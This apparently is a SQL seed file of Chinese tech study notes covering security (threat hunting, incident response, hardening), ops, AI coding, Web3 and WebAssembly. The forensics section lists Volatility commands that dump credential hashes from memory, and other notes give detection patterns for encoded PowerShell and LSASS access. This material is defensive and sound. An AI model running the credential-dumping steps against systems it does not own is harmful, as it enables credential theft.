- **SOCKS5 + proxychains**：工具链路穿透。

## 八、防御与检测
- 微分段限制横向。
- LAPS 管理本地管理员密码。
- 域控启用 protected users 组。
- EDR 检测 LSASS 访问、psexec 调用。
- 日志转发到 SIEM 关联分析。

## 小结
内网渗透是从一个落脚点扩展到整个域的过程；信息收集+凭据获取+横向移动是主线；防御靠最小权限+EDR+审计。
$md$,
'网络安全', '内网渗透与横向移动', array['内网渗透','横向移动','Mimikatz','票据'], 'seedling', '课程笔记', 5),

('红蓝对抗与威胁狩猎', 'sec-redblue-threat-hunting',
 '红队攻、蓝队守；现代对抗中威胁狩猎从被动响应转向主动假设推演。',
 $md$# 红蓝对抗与威胁狩猎

## 一、红队（攻击方）
- 目标：模拟 APT，从外网突破到内网拿到目标数据。
- 流程：侦察→武器化→投递→漏洞利用→安装→C2→行动→掩盖痕迹。
- 产出：渗透报告、补丁建议、防御盲点。

## 二、蓝队（防御方）
- 目标：检测+响应+阻断。
- 工具栈：SIEM（Splunk/Elastic）、EDR（CrowdStrike/卡巴）、NDR、SOAR。
- 流程：检测→分析→遏制→根因→恢复→复盘。

## 三、MITRE ATT&CK 框架
- 战术 Tactics：初始访问/执行/持久化/提权/防御逃避/凭据访问/发现/横向移动/收集/Exfil/Impact。
- 技术 Techniques：每战术下数百种技术（如 T1055 进程注入）。
- 用途：红队报告对齐战术、蓝队覆盖度评估。

## 四、威胁狩猎 Threat Hunting
- 假设驱动：基于情报/IoC 主动搜寻异常。
- 数据源：EDR 日志、DNS、代理日志、AD 审计、网络流量。
- 方法：
  - 异常基线（平时登录时间/IP）。
  - 横向移动线索（PsExec、WMI 异常）。
  - 持久化痕迹（计划任务、服务、注册表 Run 键）。

```sql
-- Splunk SPL 示例：找可疑 PowerShell 编码执行
index=edr source=PowerShell
  (CommandLine="*Encode*" OR CommandLine="*FromBase64*")
  | stats count by host, user, CommandLine
```

## 五、典型异常指标
- 短时间多次失败登录 → 暴力破解。
- 工作时间外域控登录 → 异常。
- PowerShell 启动子进程 → 脚本滥用。
- DNS 长域名 + 高熵 → DGA。

## 六、欺骗防御 Deception
- 蜜罐：伪造资产诱敌深入。
- Honeytoken：虚假凭据，一旦使用即告警。
- canary token：埋文档/进程，被触碰即触发。

## 七、紫队 Purple Team
- 红蓝协作：红队演练某技术，蓝队验证检测覆盖。
- 产出：检测规则、playbook 优化。

## 八、实战演练平台
- **CALDERA**（MITRE 开源）。
- **Atomic Red Team**：原子测试用例。
- **Invoke-AtomicRedTeam**：一键跑 ATT&CK 技术。

## 小结
红队验证盲点、蓝队覆盖技术矩阵；威胁狩猎主动假设、验证异常；ATT&CK 是攻防双方共同语言。
$md$,
'网络安全', '红蓝对抗与威胁狩猎', array['红蓝对抗','威胁狩猎','ATT&CK','EDR'], 'seedling', '课程笔记', 4),

('应急响应与数字取证', 'sec-incident-response-forensics',
 '事件发生后的"救火"：遏制→取证→根因→恢复→复盘。',
 $md$# 应急响应与数字取证

## 一、应急响应六阶段（PICERL）
1. **Preparation 准备**：预案、工具包、值班。
2. **Identification 识别**：告警确认、初步定性。
3. **Containment 遏制**：断网、隔离主机、禁用账户。
4. **Eradication 根除**：清理后门、补漏洞。
5. **Recovery 恢复**：业务回归、监控加固。
6. **Lessons learned 复盘**：报告、改进、培训。

## 二、Linux 取证
```bash
# 用户登录记录
last -f /var/log/wtmp
last -f /var/log/btmp            # 失败登录
# 进程异常
ps auxf
netstat -antp
ss -antp
lsof -p <pid>
# 异常文件
find / -mtime -2 -type f 2>/dev/null       # 两天内改动
find / -perm -4000                          # SUID 文件
# 计划任务
crontab -l
ls -l /etc/cron.*
# 自启动
systemctl list-unit-files --state=enabled
# 内存取证（需 Volatility）
avml memory.bin                # 在线 dump
vol.py -f memory.bin linux.pslist
```

## 三、Windows 取证
```powershell
# 事件日志
wevtutil qe Security /q:"*[System[(EventID=4624,4625,4688)]]" /c:50
# 进程与网络
Get-Process | Where-Object {$_.StartTime -gt (Get-Date).AddHours(-2)}
Get-NetTCPConnection
# 自启动
autorunsc -a * -c -v
# 计划任务
schtasks /query /fo LIST /v
# prefetch（程序执行历史）
C:\Windows\Prefetch\*.pf
# 日志关键事件
4624 登录成功 / 4625 登录失败 / 4688 进程创建 / 4720 账户创建 / 4732 加管理组
```

## 四、内存取证 Volatility
```bash
# 获取进程列表
vol.py -f mem.raw windows.pslist
# 找隐藏进程（DKOM）
vol.py -f mem.raw windows.psscan
# 找网络连接
vol.py -f mem.raw windows.netscan
# 找注入代码
vol.py -f mem.raw windows.malfind --pid <pid>
# 提取凭据
vol.py -f mem.raw windows.hashdump
vol.py -f mem.raw windows.lsadump
```

## 五、网络取证
- 全流量镜像 PCAP 存档。
- Zeek（原 Bro）日志：conn/http/dns/files。
- Threat Intelligence 比对 IoC。

## 六、根因分析
- 攻击时间线：从首字节到完全控制。
- 入口：弱口令/漏洞钓鱼/供应链。
- 影响：数据泄露范围、系统破坏程度。
- 修复：补丁、改密、加 WAF、增强监控。

## 七、报告要素
- 时间线表。
- IoC 列表（IP/域名/hash/URL）。
- 攻击路径图。
- 损失评估。
- 改进措施。

## 八、合规留证
- 证据链完整：哈希校验、时间戳、操作人。
- 必要时报警，留存电子证据。

## 小结
应急响应先遏制扩散、再取证分析；Linux 抓 wtmp/进程/计划任务，Windows 抓事件日志/进程/自启动；内存取证用 Volatility 提取凭据与隐藏进程。
$md$,
'网络安全', '应急响应与取证', array['应急响应','取证','Volatility','PICERL'], 'seedling', '课程笔记', 4),

('等保合规与安全加固', 'sec-compliance-hardening',
 '合规是底线、加固是日常；等保 2.0 / ISO 27001 / CIS Benchmarks 三大参考。',
 $md$# 等保合规与安全加固

## 一、等保 2.0 等级划分
| 等级 | 对象 | 特征 |
|---|---|---|
| 一级 | 一般系统 | 自主保护 |
| 二级 | 重要一般 | 指导保护 |
| 三级 | 重要业务 | 监督保护 |
| 四级 | 关键核心 | 强制保护 |
| 五级 | 国家安全 | 专控保护 |

## 二、等保 2.0 测评维度
- 物理/网络/主机/应用/数据 5 层。
- 管理：安全策略、制度、人员、建设、运维。
- 技术：身份认证、访问控制、安全审计、入侵防范、数据完整性、剩余信息保护。

## 三、关键控制项
- **身份鉴别**：双因素、口令复杂度、失败锁定。
- **访问控制**：最小权限、强制访问。
- **安全审计**：日志留存 ≥6 个月（网络安全法）。
- **入侵防范**：WAF、IDS/IPS、HIDS。
- **数据完整性**：传输加密、哈希校验。
- **剩余信息保护**：数据擦除、磁盘消磁。

## 四、CIS Benchmarks 加固
- 操作系统：禁用无用服务、最小化安装。
- 数据库：限制远程管理、最小权限账户。
- 中间件：禁用管理控制台、隐藏版本号。
- 云：IAM 最小策略、安全组白名单。

```bash
# Linux 加固示例
# 1. SSH 安全
sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
# 2. 失败登录锁定
pam_tally2 --user $USER --deny 5 --lock_time 600
# 3. 内核参数
echo 'net.ipv4.tcp_syncookies = 1' >> /etc/sysctl.conf
echo 'net.ipv4.conf.all.accept_redirects = 0' >> /etc/sysctl.conf
sysctl -p
```

## 五、Windows 加固
```powershell
# 禁用 SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
# 启用审计策略
auditpol /set /category:"Account Logon" /success:enable /failure:enable
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
# 开启防火墙
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

## 六、安全运维基线
- 漏洞管理：每月扫描+紧急补丁 72 小时内。
- 弱口令治理：90 天改密+8 位以上复杂度。
- 端口暴露：最小化对外端口，DMZ 隔离。
- 备份：3-2-1 规则，异地+离线。

## 七、ISO 27001 要素
- ISMS 体系：范围、策略、风险评估、控制目标。
- PDCA 循环：Plan-Do-Check-Act。
- Annex A 93 项控制：组织、人员、物理、技术。

## 八、合规自动化
- **OpenSCAP**：Linux 基线扫描。
- **Tenable Nessus**：合规扫描模板。
- **AWS Security Hub**：云合规集中面板。
- **Trivy**：容器镜像扫描。

## 小结
合规是底线、加固是日常；等保对应中国监管、CIS 对应技术落地、ISO 27001 对应管理体系；自动化扫描 + 周期审计是落地保障。
$md$,
'网络安全', '等保合规与安全加固', array['等保','合规','加固','CIS'], 'seedling', '课程笔记', 3),

-- ============ 运维与效率（5 条） ============

('Linux 运维与 Shell：从命令到自动化', 'ops-linux-ops-shell',
 'Linux 运维三件套：命令熟练、Shell 脚本、systemd 服务管理。',
 $md$# Linux 运维与 Shell

## 一、必备命令清单
```bash
# 系统监控
top / htop / btop          # 进程与负载
vmstat 1                   # CPU/内存/IO 综合
iostat -x 1                # 磁盘 IO
sar -n DEV 1               # 网络流量
free -h                    # 内存
df -hT                     # 文件系统
du -sh *                   # 目录大小

# 进程管理
ps auxf                    # 进程树
pgrep -f 'name'            # 查 PID
kill -9 PID                # 强杀
pkill -f pattern
jobs / fg / bg / nohup     # 后台任务

# 网络
ss -antp                   # 取代 netstat
ip a / ip route
tcpdump -i eth0 -nn
curl -v https://x.com
dig +short example.com
```

## 二、文本处理三剑客
```bash
# grep 检索
grep -rn 'TODO' --include='*.py' .
grep -E 'error|warning' log.txt

# sed 替换
sed -i 's/old/new/g' file.txt
sed -n '10,20p' file.txt           # 打印行范围

# awk 列处理
ps aux | awk '$3 > 10 {print $1,$11}'    # CPU>10% 的进程
awk -F: '$3 >= 1000 {print $1}' /etc/passwd   # 普通用户
```

## 三、Shell 脚本实战
```bash
#!/bin/bash
# 一键备份：压缩+校验+轮转
set -euo pipefail
BACKUP_DIR=/backup
KEEP=7
DATE=$(date +%Y%m%d)

# 1. 压缩
tar -czf "$BACKUP_DIR/data-$DATE.tar.gz" /data
# 2. 校验
sha256sum "$BACKUP_DIR/data-$DATE.tar.gz" > "$BACKUP_DIR/data-$DATE.sha"
# 3. 轮转
find "$BACKUP_DIR" -name 'data-*.tar.gz' -mtime +$KEEP -delete
echo "[$DATE] backup done"
```

## 四、systemd 服务
```ini
# /etc/systemd/system/myapp.service
[Unit]
Description=My App
After=network.target

[Service]
Type=simple
User=app
ExecStart=/opt/myapp/start.sh
Restart=always
RestartSec=3
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload
systemctl enable --now myapp
systemctl status myapp
journalctl -u myapp -f          # 滚动看日志
```

## 五、定时任务
```bash
# 用户级
crontab -e
0 3 * * * /usr/local/bin/backup.sh
# 系统级
/etc/cron.d/myjob
*/5 * * * * app /usr/local/bin/check.sh
```

## 六、性能调优
- **CPU**：绑核 `taskset`，CFS 配额 `cpu.cfs_quota_us`。
- **磁盘**：noatime、deadline 调度器、SSD TRIM。
- **网络**：somaxconn、tcp_tw_reuse、BBR 拥塞控制。

```bash
# 启用 BBR
echo 'net.core.default_qdisc=fq' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_congestion_control=bbr' >> /etc/sysctl.conf
sysctl -p
```

## 小结
Linux 运维看命令熟练度；Shell 脚本搞定重复工作；systemd 管服务；性能调优要懂内核参数 + 资源限制。
$md$,
'运维与效率', 'Linux 运维与 Shell', array['Linux','Shell','systemd','运维'], 'growing', '实战总结', 2),

('远程办公工具：RustDesk 与替代品', 'ops-remote-work-rustdesk',
 '远程办公工具按场景选：自建 RustDesk 私有化、ToDesk 免费易用、向日葵企业强。',
 $md$# 远程办公工具

## 一、主流工具对比
| 工具 | 部署 | 收费 | 协议 | 适用 |
|---|---|---|---|---|
| RustDesk | 自建/云 | 开源免费 | WebRTC | 隐私敏感 |
| ToDesk | 云 | 个人免费 | 自研 | 个人快速 |
| 向日葵 | 云 | 企业收费 | 自研 | 企业远程 |
| TeamViewer | 云 | 商业 | 自研 | 国际商用 |
| Parsec | 云 | 订阅 | 自研 | 游戏/设计 |
| VNC | 自建 | 开源 | RFB | 跨平台基础 |

## 二、RustDesk 自建
- **架构**：客户端 + hbbs（ID 注册）+ hbbr（中继）。
- **端口**：21115-21119 TCP + 21116 UDP。
- **加密**：端到端，公钥校验。

```bash
# Docker Compose 自建
sudo docker run -d --name hbbs \
  -p 21115:21115 -p 21116:21116 -p 21116:21116/udp -p 21118:21118 \
  -v $PWD/hbbs:/root \
  rustdesk/rustdesk-server hbbs -r your.server.com
sudo docker run -d --name hbbr \
  -p 21117:21117 -p 21119:21119 \
  -v $PWD/hbbr:/root \
  rustdesk/rustdesk-server hbbr
```

## 三、客户端配置
- 设置 → 网络 → ID/中继服务器：填自建域名。
- 添加公钥（Key）防止劫持。
- 设置永久密码 + 临时密码组合使用。

## 四、安全加固
- 端口只放白名单 IP。
- 关闭 unattended 的远程命令执行。
- 客户端开启二次确认。
- 配合 Tailscale 内网访问。

## 五、性能调优
- **画质**：动态码率，开启 H.265 节省 30% 带宽。
- **延迟**：硬编解码（NVENC/QSV）。
- **网络**：UDP 优先、QoS 标记。

## 六、替代场景
- 命令行远程：SSH + tmux。
- 远程开发：VS Code Remote-SSH、JetBrains Gateway。
- 远程桌面：xrdp（Linux）、VNC。
- 内网穿透：frp、chisel、Tailscale。

## 七、企业部署
- 资产管理：客户端发现+自动注册。
- 权限模型：按用户/设备授权。
- 审计：会话录像、命令日志。
- 集成 SSO：SAML/OIDC 对接 IDP。

## 小结
RustDesk 是隐私敏感场景首选；ToDesk/向日葵即开即用；命令行用 SSH+tmux，开发用 VS Code Remote，足以覆盖 99% 远程场景。
$md$,
'运维与效率', '远程办公（RustDesk/向日葵/ToDesk）', array['RustDesk','ToDesk','向日葵','远程办公'], 'growing', '实战总结', 2),

('监控告警：Prometheus 与 Grafana', 'ops-monitoring-prometheus-grafana',
 '现代监控事实标准：Prometheus 拉取+时序+Alertmanager，Grafana 可视化大屏。',
 $md$# 监控告警

## 一、监控分层
- **业务层**：订单量、支付成功率。
- **应用层**：QPS、延迟、错误率。
- **中间件**：MySQL 慢查询、Redis 命中率、MQ 堆积。
- **系统层**：CPU/内存/磁盘/网络。
- **基础设施**：机房、电源、网络。

## 二、Prometheus 架构
- **拉模式**：主动抓取 exporter 暴露的 /metrics。
- **时序数据库**：本地 TSDB，高 cardinality 警惕。
- **PromQL**：`rate(http_requests_total[5m])`。
- **服务发现**：K8s/DNS/Consul 动态发现目标。

```yaml
# prometheus.yml
scrape_configs:
  - job_name: 'node'
    static_configs:
      - targets: ['10.0.0.1:9100','10.0.0.2:9100']
  - job_name: 'k8s'
    kubernetes_sd_configs:
      - role: pod
```

## 三、Exporter 生态
| 类型 | 端口 | 说明 |
|---|---|---|
| node_exporter | 9100 | 主机指标 |
| mysql_exporter | 9104 | MySQL |
| redis_exporter | 9121 | Redis |
| blackbox_exporter | 9115 | HTTP/Ping/TCP |
| process_exporter | 9256 | 进程 |
| cAdvisor | 8080 | 容器 |

## 四、PromQL 常用
```promql
# CPU 使用率
100 - (avg by(instance)(irate(node_cpu_seconds_total{mode="idle"}[5m])) * 100)
# 内存使用率
(node_memory_MemTotal - node_memory_MemAvailable) / node_memory_MemTotal * 100
# HTTP P99
histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))
# 多维度聚合
sum by (service, status) (rate(http_requests_total[5m]))
```

## 五、Alertmanager 告警
```yaml
groups:
- name: node
  rules:
  - alert: HighCPU
    expr: 100 - avg(irate(node_cpu_seconds_total{mode="idle"}[5m]))*100 > 80
    for: 5m
    labels: { severity: warning }
    annotations:
      summary: "{{ $labels.instance }} CPU 高"
```

- 路由：按 severity/team 分发到不同渠道。
- 抑制：Critical 触发时屏蔽 Warning。
- 沉默：维护期 silences。
- 通道：钉钉/企微/邮件/PagerDuty。

## 六、Grafana 可视化
- 数据源：Prometheus/Loki/ES/MySQL。
- Dashboard：JSON 导出导入共享。
- 变量：`$instance` 切换对象。
- 告警：Grafana 9+ 内置告警引擎。

## 七、最佳实践
- 四个黄金信号：延迟、流量、错误、饱和度。
- USE 法：Utilization/Saturation/Errors。
- RED 法：Rate/Errors/Duration（服务侧）。
- 告警分级：P0 立即响应、P1 1 小时、P2 当天。

## 小结
Prometheus + Grafana 是云原生监控默认；PromQL 是核心能力；告警要分级+抑制+多渠道，避免告警风暴。
$md$,
'运维与效率', '监控告警（Prometheus/Grafana）', array['Prometheus','Grafana','Alertmanager','监控'], 'growing', '实战总结', 3),

('自动化脚本：Python 与 Shell 提效', 'ops-automation-scripts',
 '脚本让重复劳动消失：Python 干复杂逻辑、Shell 干系统操作、Ansible 干批量。',
 $md$# 自动化脚本

## 一、何时该写脚本
- 每周重复 2 次以上的任务。
- 多步骤易出错的操作。
- 需要跨多台机器一致执行。
- 需要记录操作历史。

## 二、Python 运维脚本骨架
```python
#!/usr/bin/env python3
import subprocess, logging, sys
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

def run(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if r.returncode != 0:
        logging.error(f'failed: {cmd}\n{r.stderr}')
        return None
    return r.stdout.strip()

def check_host(host):
    out = run(f"ssh {host} 'uptime; df -h /; free -h'")
    if out:
        logging.info(f'{host} OK')
    return out

if __name__ == '__main__':
    hosts = ['web1','web2','db1']
    with ThreadPoolExecutor(max_workers=10) as ex:
        list(ex.map(check_host, hosts))
```

## 三、常用库
- **paramiko/fabric**：SSH 自动化。
- **requests**：HTTP 接口。
- **click/typer**：CLI 友好。
- **rich**：彩色输出 + 进度条。
- **pyyaml/jinja2**：配置渲染。
- **psutil**：本机资源监控。

## 四、Shell 一次性任务
```bash
#!/bin/bash
# 批量同步时间并重启服务
set -e
for h in web1 web2 db1; do
  ssh $h "sudo ntpdate ntp.aliyun.com && sudo systemctl restart myapp" &
done
wait
echo "all done"
```

## 五、Ansible 批量部署
```yaml
- hosts: webservers
  become: yes
  tasks:
    - name: 安装 nginx
      apt: name=nginx state=present update_cache=yes
    - name: 部署配置
      template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf
      notify: restart nginx
    - name: 启动服务
      service: name=nginx state=started enabled=yes
  handlers:
    - name: restart nginx
      service: name=nginx state=restarted
```

## 六、CI/CD 自动化
- GitLab CI / GitHub Actions：PR 触发测试与部署。
- Jenkins：传统企业。
- ArgoCD：K8s GitOps。

## 七、定时巡检脚本
```python
# 巡检磁盘、内存、证书过期
import os, ssl, socket, smtplib
from datetime import datetime

def check_disk(path='/'):
    s = os.statvfs(path)
    free = s.f_bavail * s.f_frsize / 1e9
    return f'{path}: {free:.1f}GB free'

def check_cert(host, port=443):
    ctx = ssl.create_default_context()
    with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
        s.connect((host, port))
        cert = s.getpeercert()
    expire = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
    days = (expire - datetime.now()).days
    return f'{host}: cert expires in {days} days'
```

## 八、规范化
- 脚本放 Git，README 写清用法。
- 参数化（避免硬编码 IP/密码）。
- 日志统一打 `/var/log/myops/`。
- 失败可重试、可回滚。

## 小结
Python 写复杂逻辑、Shell 写系统操作、Ansible 写批量部署；脚本入 Git 库、参数化、日志化，让运维从体力活变成代码资产。
$md$,
'运维与效率', '自动化脚本', array['自动化','Python','Shell','Ansible'], 'growing', '实战总结', 2),

('备份与容灾：3-2-1 与异地多活', 'ops-backup-disaster-recovery',
 '备份是最后的防线：3-2-1 原则 + RPO/RTO 量化 + 异地多活。',
 $md$# 备份与容灾

## 一、核心指标
- **RPO**：恢复点目标，能容忍丢失多少数据（0 表示不丢）。
- **RTO**：恢复时间目标，能容忍多久停机。
- **MTBF**：平均无故障时间。
- **MTTR**：平均恢复时间。

## 二、3-2-1 原则
- 3 份数据副本。
- 2 种不同介质（如磁盘+磁带/云）。
- 1 份异地存放。

## 三、备份类型
| 类型 | 数据量 | 恢复时间 | 适用 |
|---|---|---|---|
| 全量 | 大 | 快 | 周期基线 |
| 增量 | 小 | 慢（需全量+所有增量） | 日常 |
| 差异 | 中 | 中（全量+1 差异） | 折中 |
| 合成全量 | 大 | 快 | 备份服务端合成 |

## 四、Linux 文件级备份
```bash
# rsync 增量同步
rsync -avz --delete --link-dest=/backup/last /data/ /backup/$(date +%F)/
# restic 增量+加密+去重
restic init --repo /backup/restic
restic backup /data --repo /backup/restic
restic snapshots --repo /backup/restic
restic restore <id> --target /restore --repo /backup/restic
```

## 五、数据库备份
```bash
# MySQL
mysqldump --single-transaction --master-data=2 --all-databases > all.sql
# Percona XtraBackup 物理热备
xtrabackup --backup --target-dir=/backup/$(date +%F)
xtrabackup --prepare --target-dir=/backup/2026-09-20
xtrabackup --copy-back --target-dir=/backup/2026-09-20

# Redis RDB + AOF
cp /var/lib/redis/dump.rdb /backup/
redis-cli BGREWRITEAOF
cp /var/lib/redis/appendonly.aof /backup/
```

## 六、容灾架构
| 级别 | RPO | RTO | 说明 |
|---|---|---|---|
| 冷备 | 小时/天 | 天 | 备份离线 |
| 热备 | 分钟 | 小时 | 实时同步 + 启动切换 |
| 双活 | 0 | 分钟 | 两地同时写 |
| 多活 | 0 | 秒 | 全球负载均衡 |

## 七、K8s 容灾
- **Velero**：备份集群资源 + PV 卷。
- **etcd 备份**：`etcdctl snapshot save`。
- **跨集群**：用 Karmada/Cluster-API 管理多集群。

```bash
# Velero 备份
velero install --provider aws --bucket velero-backup --backup-location-config region=cn-east-1
velero backup create my-backup --include-namespaces prod
velero restore create --from-backup my-backup
```

## 八、异地多活
- **数据同步**：MySQL 双向复制（注意冲突解决）、单元化（按用户路由）。
- **流量调度**：GSLB、DNS 智能解析、Anycast。
- **冲突避免**：业务层分片、雪花 ID。

## 九、备份验证
- 定期恢复演练（每季度一次）。
- 校验哈希与可读性。
- 监控备份任务成功率。

## 十、勒索防护
- 备份离线/不可变（Immutable + WORM）。
- 异地+异构（云对象存储 + 磁带）。
- 最小权限 + 审计。

## 小结
3-2-1 是底线、RPO/RTO 量化目标、定期演练验证可用；云原生用 Velero + etcd 备份；防勒索靠不可变副本+异构介质。
$md$,
'运维与效率', '备份与容灾', array['备份','容灾','3-2-1','RPO/RTO'], 'growing', '实战总结', 3),

-- ============ 前沿技术（4 条） ============

('AI 编程实践：Cursor 与 Copilot 提效指南', 'ai-coding-practice-cursor-copilot',
 'AI 编程让单人产出翻倍：提示工程、上下文管理、Agent 化工作流。',
 $md$# AI 编程实践

## 一、工具谱系
| 工具 | 定位 | 集成 |
|---|---|---|
| GitHub Copilot | 编辑器补全 | VS Code/JetBrains |
| Cursor | AI 原生编辑器 | 基于 VS Code |
| Trae / Windsurf | AI IDE | 独立 IDE |
| Claude Code / Codex | 终端 Agent | CLI |
| Devin / Cline | 自主 Agent | 任务编排 |

## 二、高效提示结构
```
[角色] 你是精通 Vue3+Vite 的资深工程师
[任务] 在 articles.vue 中加按标签过滤功能
[约束]
- 用 computed 实现过滤
- 复用已有 articleStore
- 不破坏现有样式
[参考] 已实现的功能见 src/views/articles/ArticlesList.vue
[输出] 给完整改动 diff + 简述理由
```

## 三、上下文工程
- **@文件**：让 AI 读相关文件而非凭空想象。
- **@符号库**：让 AI 懂项目结构。
- **@对话**：引用历史消息保持一致。
- **Codebase 索引**：Cursor 全库向量检索。

## 四、常见提效场景
1. 生成 CRUD 模板：单文件几秒搞定。
2. 写测试用例：从函数生成 Jest/Vitest。
3. 重构命名：批量 rename。
4. 解释复杂代码：选中代码问 "这段在做什么"。
5. 跨语言迁移：Python→Go。
6. 调 SQL：贴表结构让它写索引建议。

## 五、Agent 化工作流
- **Browser Use / Computer Use**：让 AI 操作浏览器。
- **多 Agent 协作**：planner+coder+reviewer。
- **MCP 协议**：让 AI 调用外部工具（文件/DB/API）。

## 六、防坑
- 别盲信代码，一定要 review。
- 大模型会幻觉 API：用 `npm view` 验证。
- 不上传公司机密到公共模型。
- 复杂任务分段，避免 context 爆炸。

## 七、本地大模型
- Ollama + deepseek-coder/Qwen2.5-Coder：本地补全。
- LM Studio：图形化管理。
- 优势：隐私 + 可断网。

## 八、CI 集成
- **AI Code Review**：用 GPT-4 做 PR 自动评审。
- **AI 生成提交信息**：基于 diff 总结。
- **AI 文档生成**：从代码提取 README/API 文档。

## 小结
AI 编程让个人能力指数级放大；关键是写清提示+管理上下文+善用 Agent；但人类仍是 reviewer 守门人。
$md$,
'前沿技术', 'AI 编程实践', array['AI编程','Cursor','Copilot','Agent'], 'growing', '实战总结', 2),

('Web3 与区块链：从密码学到智能合约', 'web3-blockchain-crypto-smart-contract',
 'Web3 三件套：密码学（ECDSA/哈希）、共识（PoW/PoS）、智能合约（Solidity）。',
 $md$# Web3 与区块链

## 一、核心概念
- **链式结构**：每块包含上一块哈希，防篡改。
- **默克尔树**：交易聚合哈希，SPV 验证轻量。
- **节点类型**：全节点/轻节点/矿工/验证者。

## 二、密码学基础
- **哈希**：SHA-256/Keccak256，单向、抗碰撞。
- **椭圆曲线**：secp256k1，私钥→公钥→地址。
- **签名**：ECDSA，私钥签、公钥验。

```javascript
// ethers.js 生成钱包
const { Wallet } = require('ethers');
const w = Wallet.createRandom();
console.log('addr:', w.address);
console.log('priv:', w.privateKey);
console.log('mnemonic:', w.mnemonic.phrase);
```

## 三、共识机制
| 共识 | 代表 | 特点 |
|---|---|---|
| PoW | Bitcoin | 算力挖矿，能耗高 |
| PoS | Ethereum 2.0 | 质押代币，绿色 |
| DPoS | EOS | 委托少数节点 |
| PBFT | 联盟链 | 三阶段提交，高吞吐 |
| Avalanche | 子网 | 抽样共识 |

## 四、智能合约 Solidity
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleStorage {
    uint256 public value;
    mapping(address => uint256) public balances;

    function set(uint256 v) external {
        value = v;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient');
        // 注意重入风险：先扣余额再转账（CEI 模式）
        balances[msg.sender] -= amount;
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
    }
}
```

## 五、常见漏洞
- **重入攻击**：DAO 事件，外部调用回马枪，用 CEI 或 ReentrancyGuard。
- **整数溢出**：Solidity 0.8+ 默认 revert，旧版用 SafeMath。
- **access control**：忘了加 onlyOwner。
- **闪电贷攻击**：DeFi 套娃组合利用。
- **front-running**：MEV 抢跑，私池或 commit-reveal 缓解。

## 六、开发工具链
- **Foundry**：Rust 写的 Solidity 测试框架，快。
- **Hardhat**：JS 脚手架，插件生态丰富。
- **OpenZeppelin**：标准库，复用安全组件。
- **Remix**：在线 IDE。
- **ethers.js/viem**：前端与链交互。

## 七、Layer2 与扩展
- **Rollup**：把交易打包到 L1，继承安全性。
- **Optimistic Rollup**：欺诈证明（Arbitrum/Optimism）。
- **ZK Rollup**：零知识证明（zkSync/Starknet）。
- **侧链**：独立共识（Polygon PoS）。

## 八、生态地图
- 公链：Ethereum/Solana/Aptos/Sui。
- DeFi：Uniswap/Aave/Compound。
- NFT：OpenSea/ENS。
- 存储：IPFS/Arweave/Filecoin。
- 身份：ENS/Lens/SpaceID。

## 小结
Web3 = 密码学 + 共识 + 智能合约；Solidity 入门要懂重入/溢出/access control；L2 用 Rollup 扩展以太坊；DeFi/NFT/链上身份是主要应用。
$md$,
'前沿技术', 'Web3 与区块链', array['Web3','区块链','Solidity','智能合约'], 'seedling', '课程笔记', 4),

('WebAssembly：浏览器里的接近原生性能', 'wasm-webassembly-native-web',
 'Wasm 是可移植字节码格式，浏览器/服务端/嵌入式都能跑，速度接近原生。',
 $md$# WebAssembly

## 一、核心特征
- **二进制指令格式**：体积小、解码快。
- **沙箱化执行**：内存隔离、能力受限。
- **跨平台**：Linux/Win/macOS/嵌入式通用。
- **语言无关**：C/C++/Rust/Go/AssemblyScript 都能编译。

## 二、典型场景
- **计算密集**：图像处理、视频编解码、物理引擎。
- **跨端复用**：复用 C++ 库到 Web（如 ffmpeg.wasm）。
- **边缘计算**：Cloudflare Workers、Fastly。
- **插件系统**：可安全加载第三方代码。
- **区块链**：Polkadot Runtime、Diem Move。

## 三、Rust 编译到 Wasm
```rust
// Cargo.toml
// [lib]
// crate-type = ['cdylib']

#[no_mangle]
pub extern 'C' fn add(a: i32, b: i32) -> i32 {
    a + b
}

#[no_mangle]
pub extern 'C' fn fib(n: u32) -> u32 {
    if n < 2 { n } else { fib(n-1) + fib(n-2) }
}
```

```bash
rustup target add wasm32-unknown-unknown
cargo build --target wasm32-unknown-unknown --release
# 输出 target/wasm32-unknown-unknown/release/mylib.wasm
```

## 四、JS 调用 Wasm
```javascript
// 浏览器加载
const resp = await fetch('mylib.wasm');
const bytes = await resp.arrayBuffer();
const { instance } = await WebAssembly.instantiate(bytes, {
  env: { log: (x) => console.log('from wasm:', x) }
});
console.log(instance.exports.add(2, 3));          // 5
console.log(instance.exports.fib(20));            // 6765
```

## 五、内存与共享
- Wasm 线性内存：`Memory` 对象，JS 与 Wasm 共享 ArrayBuffer。
- 大数据传递：传指针偏移 + 长度，避免拷贝。

```javascript
const mem = new WebAssembly.Memory({ initial: 1 });
const view = new Uint8Array(mem.buffer);
// Wasm 内部读写这块内存
```

## 六、性能对比
| 场景 | JS | Wasm |
|---|---|---|
| 斐波那契 35 | ~150ms | ~30ms |
| 图像卷积 | 慢 | 2-3 倍快 |
| JSON 解析 | V8 已优化 | 接近 |

## 七、工具链
- **Emscripten**：C/C++ 一站式编译，自动生成胶水 JS。
- **wasm-pack**：Rust→npm 包，配合 wasm-bindgen。
- **AssemblyScript**：TS 语法写 Wasm，门槛最低。
- **wabt**：wat↔wasm 互转、反汇编。

## 八、局限与演进
- **GC**：WasmGC 提案让 Kotlin/Java 直接生成 Wasm。
- **SIMD**：并行加速。
- **线程**：SharedArrayBuffer + Worker。
